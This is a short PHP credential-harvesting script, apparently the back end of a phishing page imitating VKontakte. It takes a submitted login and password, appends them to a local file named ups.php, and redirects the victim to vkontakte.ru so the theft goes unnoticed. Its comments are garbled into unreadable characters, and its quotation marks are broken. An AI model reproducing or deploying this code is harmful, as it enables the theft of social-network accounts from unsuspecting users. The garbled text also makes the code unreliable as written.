<?

$Login = $_POST[zabor]; // �����  ������

$Pass = $_POST[�zena�]; // ������ ������

$log = fopen(�ups.php�,�a+�); //��� ����� ������ ������ �����

fwrite($log,�<br> $Login:$Pass \n�); //���������� ������ � ups.php

fclose($log); //��������� ups.php

echo �<html><head><META HTTP-EQUIV=�Refresh� content =�0; URL=http://vkontakte.ru�></head></html>�; // �������������� ������ �� http://vk.com

?>